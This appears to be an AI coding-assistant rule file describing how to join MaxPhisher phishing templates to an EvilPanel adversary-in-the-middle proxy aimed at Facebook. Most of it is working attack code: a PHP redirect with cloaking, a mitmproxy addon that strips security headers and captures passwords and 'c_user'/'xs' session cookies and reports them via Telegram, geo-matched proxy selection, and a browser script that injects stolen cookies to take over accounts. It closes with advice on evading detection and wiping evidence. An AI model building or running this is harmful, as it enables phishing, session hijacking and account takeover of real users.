---
trigger: model_decision
description: "TAGS: [redteam,maxphisher,aitm,proxy,session-capture] | TRIGGERS: maxphisher,aitm,proxy,evilpanel,mitmproxy | SCOPE: maxphisher | DESCRIPTION: MaxPhisher AiTM proxy integration patterns for session hijacking"
globs:
---
# MaxPhisher AiTM Proxy Integration Module

## Scope
Integration patterns between MaxPhisher static templates and EvilPanel AiTM proxy.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    MAXPHISHER + AITM FLOW                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  [Victim] ──► [Template/index.php] ──► [REDIRECT] ──► [EvilPanel]  │
│                      │                                    │         │
│                      ▼                                    ▼         │
│              [Fingerprint]                    [mitmproxy AiTM]      │
│              [Collection]                     [Session Capture]     │
│                      │                                    │         │
│                      ▼                                    ▼         │
│              [ip.php/save_fp]                [c_user + xs tokens]   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## Template → AiTM Trigger Pattern

### index.php Integration
```php
<?php
// AiTM proxy URL from environment variable
$aitm_url = getenv("EVILPANEL_URL") ?: "https://m.facebook.com/";

// Include anti-detection and fingerprint collection first
include "validate.php";    // Cloaking/bot detection
include "ip.php";          // IP logging
include "shadow_config.php"; // OG meta tags for preview
?>

<!-- In JavaScript CTA button handler -->
<script>
ctaButton?.addEventListener('click', () => {
    const targetUrl = '<?php echo $aitm_url; ?>';
    // Handle in-app browser detection
    // Redirect to AiTM proxy for session capture
    window.location.href = targetUrl;
});
</script>
```

### Environment Configuration
```bash
# Set on VPS before running
export EVILPANEL_URL="https://your-aitm-domain.com/"
export EVILPANEL_DOMAIN="your-aitm-domain.com"
export EVILPANEL_DATA="/opt/evilpanel/data"
```

## mitmproxy Addon Enhancement

### Enhanced Session Capture
```python
class EvilPanelAddon:
    """Enhanced mitmproxy addon for session hijacking"""
    
    def __init__(self):
        self.domain = os.environ.get("EVILPANEL_DOMAIN")
        self.critical_tokens = ["c_user", "xs"]
        self.all_tokens = ["c_user", "xs", "fr", "datr", "sb", "wd"]
        self._init_db()
    
    def request(self, flow: http.HTTPFlow):
        # Get victim IP for geo-targeting
        target_ip = flow.client_conn.peername[0]
        
        # Build geo-matched proxy
        geo = self._get_geo(target_ip)
        proxy_levels = self._build_proxy_levels(geo)
        
        # Store in flow metadata for response handler
        flow.metadata["target_ip"] = target_ip
        flow.metadata["geo"] = geo
        flow.metadata["proxy_levels"] = proxy_levels
        
        # Rewrite host from phishing domain to real Facebook
        if flow.request.host.endswith(self.domain):
            flow.request.host = flow.request.host.replace(
                self.domain, "facebook.com"
            )
            flow.request.headers["Host"] = flow.request.host
        
        # Capture credentials from POST
        if flow.request.method == "POST":
            self._capture_credentials(flow)
    
    def response(self, flow: http.HTTPFlow):
        # Strip security headers
        security_headers = [
            "Content-Security-Policy",
            "X-Frame-Options", 
            "Strict-Transport-Security",
            "X-Content-Type-Options"
        ]
        for header in security_headers:
            if header in flow.response.headers:
                del flow.response.headers[header]
        
        # Capture session tokens
        self._capture_session_tokens(flow)
        
        # Rewrite cookies from facebook.com to our domain
        self._rewrite_cookies(flow)
```

### Geo-Proxy Integration for Session Injection
```python
def _build_proxy_levels(self, geo):
    """Build DataImpulse proxy URLs from most to least specific"""
    if not geo:
        return [(f"socks5://{USER}:{PASS}@{HOST}:{PORT}", "BASE")]
    
    levels = []
    c, a, s, ci, z = (
        geo.get("country", ""),
        geo.get("asn", ""),
        geo.get("state", ""),
        geo.get("city", ""),
        geo.get("zip", "")
    )
    
    # FULL specificity (best for session injection)
    if all([a, s, ci, z]):
        params = f"cr.{c};asn.{a};state.{s};city.{ci};zip.{z}"
        levels.append((f"socks5://{USER}__{params}:{PASS}@{HOST}:{PORT}", "FULL"))
    
    # Fallback levels...
    if all([a, s, ci]):
        params = f"cr.{c};asn.{a};state.{s};city.{ci}"
        levels.append((f"socks5://{USER}__{params}:{PASS}@{HOST}:{PORT}", "NO_ZIP"))
    
    # ASN_ONLY (minimum for Facebook fingerprint matching)
    if a:
        params = f"cr.{c};asn.{a}"
        levels.append((f"socks5://{USER}__{params}:{PASS}@{HOST}:{PORT}", "ASN_ONLY"))
    
    # BASE (last resort)
    levels.append((f"socks5://{USER}:{PASS}@{HOST}:{PORT}", "BASE"))
    
    return levels
```

## Token Capture Patterns

### Critical Facebook Tokens
| Token | Purpose | Capture Priority |
|-------|---------|-----------------|
| `c_user` | User ID | CRITICAL |
| `xs` | Session auth | CRITICAL |
| `datr` | Browser fingerprint | HIGH |
| `fr` | Facebook tracking | MEDIUM |
| `sb` | Browser identifier | MEDIUM |

### Credential + Token Storage
```python
def _capture_session_tokens(self, flow):
    """Extract session tokens from Set-Cookie headers"""
    captured = {}
    
    for cookie in flow.response.cookies:
        name = cookie[0]
        value = cookie[1][0] if cookie[1] else ""
        if name in self.all_tokens and value:
            captured[name] = value
    
    # Only save if critical tokens present
    if all(k in captured for k in self.critical_tokens):
        record = {
            "timestamp": datetime.utcnow().isoformat(),
            "tokens": captured,
            "ip": flow.metadata.get("target_ip"),
            "geo": flow.metadata.get("geo"),
            "proxy_levels": flow.metadata.get("proxy_levels"),
            "user_agent": flow.request.headers.get("User-Agent")
        }
        
        # Save to JSON and DB
        self._save_session(record)
        
        # Notify via Telegram
        self._notify_capture(record)
```

## Session Injection Flow

### Post-Capture Injection
```python
from camoufox.sync_api import Camoufox

def inject_session(captured_session: dict):
    """Inject captured session into Camoufox browser"""
    
    tokens = captured_session["tokens"]
    proxy_levels = captured_session["proxy_levels"]
    
    # Try proxies from most to least specific
    for proxy_url, level in proxy_levels:
        try:
            with Camoufox(
                headless=False,
                proxy={"server": proxy_url}
            ) as browser:
                page = browser.new_page()
                
                # Navigate to set cookie domain
                page.goto("https://facebook.com")
                
                # Inject cookies
                for name, value in tokens.items():
                    browser.context.add_cookies([{
                        "name": name,
                        "value": value,
                        "domain": ".facebook.com",
                        "path": "/"
                    }])
                
                # Verify session
                page.goto("https://www.facebook.com/me")
                
                if verify_logged_in(page):
                    return True, level
                    
        except Exception:
            continue  # Try next proxy level
    
    return False, None
```

## Tunneler Integration

### URL Flow
```
Template (PHP) → Cloudflared/LocalXpose → AiTM Proxy → Real Facebook
                    ↓
              [EVILPANEL_URL env]
```

### maxphisher2.py Tunneler Setup
```python
# Template gets served via tunneler
bgtask(f"php -S {local_url}", stdout=php_log, cwd=site_dir)

# Cloudflared tunnel
bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log)

# URL extraction for template to use
cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
```

## OPSEC Requirements

1. **AiTM Domain Separation**
   - Use different domain for AiTM vs template
   - Template on tunneler, AiTM on dedicated VPS

2. **Token Storage Security**
   - Encrypt all stored tokens
   - Auto-expire old sessions

3. **Proxy Rotation**
   - Use geo-matched residential proxies
   - Rotate on each injection attempt

4. **Evidence Cleanup**
   - Clear logs after successful injection
   - Remove fingerprint data
